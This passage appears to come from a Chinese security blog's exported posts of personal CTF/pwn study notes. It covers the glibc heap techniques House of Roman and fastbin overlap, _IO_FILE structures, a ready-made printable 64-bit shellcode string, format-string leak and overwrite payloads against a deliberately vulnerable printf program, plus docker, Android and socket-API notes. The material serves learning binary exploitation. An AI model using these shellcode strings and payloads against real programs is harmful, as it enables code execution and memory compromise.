<h4 id="POC2"><a href="#POC2" class="headerlink" title="POC2"></a>POC2</h4><p>通过修改chunk1的fd位指向伪造堆块实现overlap。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">chunk1 = malloc(<span class="number">0x40</span>);//<span class="number">0x602000</span></span><br><span class="line">chunk2 = malloc(<span class="number">0x100</span>);//<span class="number">0x602050</span></span><br><span class="line">chunk2[<span class="number">1</span>] = <span class="number">0x31</span>;</span><br><span class="line">chunk2[<span class="number">7</span>]=<span class="number">0x21</span>;</span><br><span class="line">chunk2[<span class="number">11</span>]=<span class="number">0x21</span>;</span><br><span class="line">free(chunk1);</span><br><span class="line">chunk1[<span class="number">0</span>]=<span class="number">0x602060</span>;</span><br><span class="line">malloc(<span class="number">5000</span>);</span><br></pre></td></tr></table></figure>

<p>此时bin中存在0x50(0x602000)以及0x30(0x602060)，申请即可实现overlap。</p>
<h3 id="House-of-Roman"><a href="#House-of-Roman" class="headerlink" title="House of Roman"></a>House of Roman</h3><p>思路：</p>
<ul>
<li>首先分配 <code>3</code> 个 <code>chunk （A , B, C）</code> ，大小分别为 <code>0x20, 0xd0, 0x70</code></li>
<li>在 <code>B + 0x78</code> 处设置 <code>p64(0x61)</code> ， 作用是 <code>fake size</code> ,用于后面 的 <code>fastbin attack</code></li>
<li>释放掉 <code>B</code> , <code>B</code> 进入 <code>unsorted bin</code> , 此时 <code>B+0x10</code> 和 <code>B+0x18</code> 中有 <code>main_arean</code> 的地址</li>
<li>再次分配 <code>0xd0</code> , 会分配到 <code>B</code>， 此时 <code>B+0x10</code> 和 <code>B+0x18</code> 中 <code>main_arean</code> 的地址依然存在</li>
<li>然后分配 <code>3</code> 个 <code>0x70</code> 的 <code>chunk (D , E, F)</code>， 为后续做准备</li>
<li>在 <code>A</code> 触发 单字节溢出，修改 <code>B-&gt;size = 0x71</code> . 然后释放 <code>C , D</code>， 此时 <code>C , D</code> 进入 <code>fastbin</code> , 同时 <code>D-&gt;fd = C</code>. 由于 <code>chunk</code>之间的相对偏移固定，于是利用 <code>uaf</code> 修改 <code>D-&gt;fd</code> 的低 字节 ，使得 <code>D-&gt;fd=B</code></li>
<li>此时 <code>B-&gt;size = 0x71</code> ，同时 <code>B + 0x78</code> 为 <code>p64(0x61)</code> （第2步设置）， 这就成功伪造了一个 <code>0x70</code> 大小的 <code>fastbin</code>。 此时 <code>B-&gt;fd</code> 为 <code>main_arean</code> 的地址，于是通过 修改 低 <code>2</code>个字节，可以修改到<code>malloc_hook - 0x23</code> 处 （ <code>malloc_hook - 0x23 + 0x8</code> 处的值为 <code>p64(0x7f)</code> )</li>
<li>然后分配 <code>3</code> 次 <code>0x70</code> 的 <code>chunk</code>， 就可以拿到包含 <code>malloc_hook</code> 的 <code>chunk</code>, 此时 <code>malloc_hook</code> 内容为 <code>0</code></li>
<li>然后利用 <code>unsorted bin</code> 修改 <code>malloc_hook</code> 内容为 <code>main_arean</code> 的地址</li>
<li>利用部分写修改 <code>malloc_hook</code> 为 <code>one_gadget</code></li>
<li>多次释放一个指针，触发 <code>double free</code> 异常，进而触发 <code>malloc_printerr</code> ， <code>getshell</code></li>
</ul>
<h3 id="House-of-Corrosion"><a href="#House-of-Corrosion" class="headerlink" title="House-of-Corrosion"></a>House-of-Corrosion</h3><h1 id="IO"><a href="#IO" class="headerlink" title="IO"></a>IO</h1><h2 id="相关结构"><a href="#相关结构" class="headerlink" title="相关结构"></a>相关结构</h2><h3 id="IO-FILE-plus"><a href="#IO-FILE-plus" class="headerlink" title="_IO_FILE_plus"></a>_IO_FILE_plus</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">_IO_FILE file;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>注：_IO_FILE是整个嵌入, _IO_jump_t为指针</p>
<h3 id="FILE"><a href="#FILE" class="headerlink" title="FILE"></a>FILE</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it's too small.  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> short _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="vtable-IO-jump-t"><a href="#vtable-IO-jump-t" class="headerlink" title="vtable IO_jump_t"></a>vtable IO_jump_t</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="vtable-IO-str-jumps"><a href="#vtable-IO-str-jumps" class="headerlink" title="vtable _IO_str_jumps"></a>vtable _IO_str_jumps</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(<span class="built_in">overflow</span>, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(<span class="built_in">read</span>, _IO_default_read),</span><br><span class="line">  JUMP_INIT(<span class="built_in">write</span>, _IO_default_write),</span><br><span class="line">  JUMP_INIT(<span class="built_in">seek</span>, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(<span class="built_in">close</span>, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>shellcode</title>
    <url>/2020/05/09/pwn/shellcode/</url>
    <content><![CDATA[<h1 id="64位可打印shell"><a href="#64位可打印shell" class="headerlink" title="64位可打印shell"></a>64位可打印shell</h1><p>PPYh00AAX1A0hA004X1A4hA00AX1A8QX44Pj0X40PZPjAX4znoNDnRYZnCXA</p>
<h1 id="pwntools模块"><a href="#pwntools模块" class="headerlink" title="pwntools模块"></a>pwntools模块</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'amd64'</span> <span class="comment">#64位</span></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br></pre></td></tr></table></figure>

<h1 id="shellcode-encoder"><a href="#shellcode-encoder" class="headerlink" title="shellcode_encoder"></a>shellcode_encoder</h1><p>下载地址：<a href="https://github.com/ecx86/shellcode_encoder" target="_blank" rel="noopener">https://github.com/ecx86/shellcode_encoder</a></p>
<p>自动生成可打印shell：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python ./main.py shellcode rax+29</span><br></pre></td></tr></table></figure>

<p>其中shellcode为原shellcode的二进制文件，rax+29表示通过call rax执行shellcode。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Android-day9</title>
    <url>/2020/06/05/Android/Android-day9/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>《第一行代码：Android》这本书的内容已经结束了，接下来就开始看看安全相关的吧，有机会的话再继续深入理论，争取啃回linux内核层。</p>
<p>接下来的书：《Android应用安全防护和逆向分析》</p>
<h1 id="Android中锁屏密码加密算法分析"><a href="#Android中锁屏密码加密算法分析" class="headerlink" title="Android中锁屏密码加密算法分析"></a>Android中锁屏密码加密算法分析</h1><h2 id="密码算法分析"><a href="#密码算法分析" class="headerlink" title="密码算法分析"></a>密码算法分析</h2><p>代码：LockPatternUtils.java</p>
<p>原文密码+设备salt值，然后分别进行MD5和SHA-1操作，转化为hex值再次拼接，得到的就是保存到本地的加密密码内容。</p>
<p>getSalt方法根据字段key从一个地方获取salt值，如果这个值为0，则随机生成一个，然后保存到那个地方。</p>
<h1 id="……"><a href="#……" class="headerlink" title="……"></a>……</h1><p>此处省略一万字，内容都是看源码的，有兴趣的可以直接开撸吧，反正思路是那个思路，具体过程看书就好，没啥好记录的感觉。</p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>格式化字符串</title>
    <url>/2020/05/09/pwn/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<h1 id="泄露内存"><a href="#泄露内存" class="headerlink" title="泄露内存"></a>泄露内存</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="keyword">int</span> a = <span class="number">1</span>, b = <span class="number">0x22222222</span>, c = <span class="number">-1</span>;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%08x.%08x.%08x.%s\n"</span>, a, b, c, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>$gcc -m32 -fno-stack-protector -no-pie -o leakmemory leakmemory.c</p>
<ol>
<li>%08x.%08x                            以8位16进制方式输出print函数第一、二个参数</li>
<li>%p.%p                                与第一个等价</li>
<li>%3$x                                以8位16进制方式输出print函数第三个参数</li>
<li>addr%4$x                            以8位16进制方式输出addr对应函数的第四个参数</li>
<li>[padding][addr]%4$x                        同上，[padding]为填充字符</li>
</ol>
<h1 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* example/overflow/overflow.c */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a = <span class="number">123</span>, b = <span class="number">456</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> c = <span class="number">789</span>;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">100</span>];</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, &amp;c);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>, s);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="keyword">if</span> (c == <span class="number">16</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"modified c."</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (a == <span class="number">2</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"modified a for a small number."</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (b == <span class="number">0x12345678</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"modified b for a big number!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>…[overwrite addr]….%[overwrite offset]$n                … 表示填充内容，overwrite addr 表示覆盖的地址，overwrite offset 地址表示覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数（$n为0-0xffffffff,$hn为0-0xffff,$hhn为0-0xff）</li>
<li>[addr of c]%012d%6$n                            覆盖从c为0x10(填充入字符串长度)，%012补充长度至0x10</li>
<li>a%8$naaa[addr of a]                            覆盖a变量为1，最大可为4(a为填充字符，使地址对齐)</li>
<li>%016c%8$naaa[addr of a]                            覆盖a变量为0x10</li>
<li>p32(b_addr) + p32(b_addr + 1) + p32(b_addr + 2) + p32(b_addr + 3) + ‘%104c%6$hn’ + ‘%070c%7$hn’+ ‘%036c%8$hn’+ ‘%002c’%9$hn’                覆盖b变量为0xe4e2be78（0xbe=16+104+70,0xe2=16+104+70+36,以此类推，超出256则减去256）</li>
</ol>
<p>另外，格式化字符串所用到的参数会被依次压入printf内部函数的栈中保存(比如输入%100$p就会将第100位置处的值取出后再压入printf栈中保存以备后续操作)。</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>pwndocker篇</title>
    <url>/2020/05/16/tool/Pwndocker%E7%AF%87/</url>
    <content><![CDATA[<h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="docker安装"><a href="#docker安装" class="headerlink" title="docker安装"></a>docker安装</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ curl -fsSL https://get.docker.com -o get-docker.sh</span><br><span class="line">$ sudo sh get-docker.sh</span><br><span class="line">$ sudo usermod -aG docker username</span><br></pre></td></tr></table></figure>

<h2 id="pwndocker安装"><a href="#pwndocker安装" class="headerlink" title="pwndocker安装"></a>pwndocker安装</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ docker pull skysider/pwndocker</span><br></pre></td></tr></table></figure>

<h2 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h2><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">$ pip2 install -i https:<span class="comment">//pypi.tuna.tsinghua.edu.cn/simple pwntools</span></span><br></pre></td></tr></table></figure>

<p>后面gdb.attach()有点问题，还是先用python3吧</p>
<h1 id="镜像管理"><a href="#镜像管理" class="headerlink" title="镜像管理"></a>镜像管理</h1><h2 id="保存镜像"><a href="#保存镜像" class="headerlink" title="保存镜像"></a>保存镜像</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ docker commit docker_id mydocker</span><br></pre></td></tr></table></figure>

<h2 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ docker rmi -f mydocker</span><br></pre></td></tr></table></figure>

<h1 id="容器管理"><a href="#容器管理" class="headerlink" title="容器管理"></a>容器管理</h1><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ docker run -d --privileged skysider/pwndocker</span><br></pre></td></tr></table></figure>

<p>即可后台运行（–privileged表示特权级运行，不加gdb会没有权限）</p>
<p>第二次直接查看id后运行：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ docker ps -a</span><br><span class="line">$ docker start docker_id</span><br></pre></td></tr></table></figure>

<h2 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ docker <span class="built_in">exec</span> -it docker_id /bin/sh</span><br></pre></td></tr></table></figure>

<p>即可进入docker的shell</p>
<h2 id="停止docker"><a href="#停止docker" class="headerlink" title="停止docker"></a>停止docker</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ docker stop docker_id</span><br></pre></td></tr></table></figure>

<h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ docker rm docker_id</span><br></pre></td></tr></table></figure>

<h1 id="指定libc"><a href="#指定libc" class="headerlink" title="指定libc"></a>指定libc</h1><p>首先写个shell脚本实现自动化</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">id=***</span><br><span class="line">docker cp ./1.py <span class="variable">$&#123;id&#125;</span>:/tmp</span><br><span class="line">docker cp ./elf <span class="variable">$&#123;id&#125;</span>:/tmp</span><br><span class="line">docker <span class="built_in">exec</span> -it <span class="variable">$&#123;id&#125;</span> chmod 777 /tmp/elf</span><br><span class="line">docker <span class="built_in">exec</span> -it <span class="variable">$&#123;id&#125;</span> chmod 777 /tmp/1.py</span><br><span class="line">docker <span class="built_in">exec</span> -it <span class="variable">$&#123;id&#125;</span> cp /glibc/2.29/64/lib/ld-2.29.so /tmp</span><br><span class="line">docker <span class="built_in">exec</span> -it <span class="variable">$&#123;id&#125;</span> cp /glibc/2.29/64/lib/libc.so.6 /tmp</span><br><span class="line">docker <span class="built_in">exec</span> -it <span class="variable">$&#123;id&#125;</span> patchelf --<span class="built_in">set</span>-interpreter /tmp/ld-2.29.so /tmp/elf</span><br><span class="line">docker <span class="built_in">exec</span> -it <span class="variable">$&#123;id&#125;</span> tmux</span><br></pre></td></tr></table></figure>

<p>具体功能就是将elf和python文件cp到docker上，然后给予权限，再将libc和ld（这里用2.29版本）移到/tmp下，再用patchelf –set-interpreter修改elf的ld文件，然后进入tmux。这里还需要在手动运行python脚本（这里不会自动化，希望有大佬能帮忙下）。</p>
<p>然后就是python脚本中指定libc执行：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"/tmp/elf"</span>, env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/tmp/libc.so.6"</span>&#125;)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'splitw'</span>,<span class="string">'-h'</span>]</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>tool</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>tool</tag>
        <tag>docker</tag>
        <tag>glibc</tag>
      </tags>
  </entry>
  <entry>
    <title>socket编程详解</title>
    <url>/2020/05/20/%E7%BC%96%E7%A8%8B/socket%E7%BC%96%E7%A8%8B%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>网络进程标识：ip地址，协议，端口。</p>
<p>TCP/IP是传输控制协议/网间协议。</p>
<p>TCP/IP协议存在于OS中，网络服务通过OS提供，在OS中增加支持TCP/IP的系统调用。</p>
<p>Socket是应用层与TCP/IP协议族通信的中间软件抽象层，它是一组接口。</p>
<h2 id="Socket-API"><a href="#Socket-API" class="headerlink" title="Socket API"></a>Socket API</h2><h3 id="socket-函数"><a href="#socket-函数" class="headerlink" title="socket()函数"></a>socket()函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket</span><span class="params">(<span class="keyword">int</span> protofamily, <span class="keyword">int</span> typ, <span class="keyword">int</span> protocol)</span></span>; <span class="comment">//返回sockfd</span></span><br></pre></td></tr></table></figure>

<p>该函数用于创建一个socket描述符，它唯一标识一个socket。其中三个参数分别如下：</p>
<ul>
<li>protofamily：即协议域，又称为协议族（family）。常用的协议族有，AF_INET(IPV4)、AF_INET6(IPV6)、AF_LOCAL（或称AF_UNIX，Unix域socket）、AF_ROUTE等等。协议族决定了socket的地址类型，在通信中必须采用对应的地址，如AF_INET决定了要用ipv4地址（32位的）与端口号（16位的）的组合、AF_UNIX决定了要用一个绝对路径名作为地址。当其为0时，会自动选择type对应的默认协议。</li>
<li>type：指定socket类型。常用的socket类型有，SOCK_STREAM、SOCK_DGRAM、SOCK_RAW、SOCK_PACKET、SOCK_SEQPACKET等等。</li>
<li>protocol：顾名思意，就是指定协议。常用的协议有，IPPROTO_TCP、IPPTOTO_UDP、IPPROTO_SCTP、IPPROTO_TIPC等，它们分别对应TCP传输协议、UDP传输协议、STCP传输协议、TIPC传输协议。</li>
</ul>
<p>注：protofamily与type不可随意组合。</p>
<h3 id="bind-函数"><a href="#bind-函数" class="headerlink" title="bind()函数"></a>bind()函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br></pre></td></tr></table></figure>

<p>该函数用来把一个特定地址赋给sockfd，如127.0.0.1:80。若未用该函数直接connect()，list()时系统会随机分配一个端口号。</p>
<p>函数的三个参数分别为：</p>
<ul>
<li><p>sockfd：即socket描述字，它是通过socket()函数创建了，唯一标识一个socket。bind()函数就是将给这个描述字绑定一个名字。</p>
</li>
<li><p>addr：一个const struct sockaddr *指针，指向要绑定给sockfd的协议地址。这个地址结构根据地址创建socket时的地址协议族的不同而不同，如ipv4对应的是： </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> &#123;</span></span><br><span class="line">    <span class="keyword">sa_family_t</span>    sin_family; <span class="comment">/* address family: AF_INET */</span></span><br><span class="line">    <span class="keyword">in_port_t</span>      sin_port;   <span class="comment">/* port in network byte order */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span>   <span class="comment">/* internet address */</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Internet address. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span>       s_addr;     <span class="comment">/* address in network byte order */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ipv6对应的是： </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in6</span> &#123;</span> </span><br><span class="line">    <span class="keyword">sa_family_t</span>     sin6_family;   <span class="comment">/* AF_INET6 */</span> </span><br><span class="line">    <span class="keyword">in_port_t</span>       sin6_port;     <span class="comment">/* port number */</span> </span><br><span class="line">    <span class="keyword">uint32_t</span>        sin6_flowinfo; <span class="comment">/* IPv6 flow information */</span> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in6_addr</span> <span class="title">sin6_addr</span>;</span>     <span class="comment">/* IPv6 address */</span> </span><br><span class="line">    <span class="keyword">uint32_t</span>        sin6_scope_id; <span class="comment">/* Scope ID (new in 2.4) */</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in6_addr</span> &#123;</span> </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span>   s6_addr[<span class="number">16</span>];   <span class="comment">/* IPv6 address */</span> </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>Unix域对应的是： </p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UNIX_PATH_MAX    108</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> &#123;</span> </span><br><span class="line">    <span class="keyword">sa_family_t</span> sun_family;               <span class="comment">/* AF_UNIX */</span> </span><br><span class="line">    <span class="keyword">char</span>        sun_path[UNIX_PATH_MAX];  <span class="comment">/* pathname */</span> </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li><p>addrlen：对应的是地址的长度。</p>
</li>
</ul>
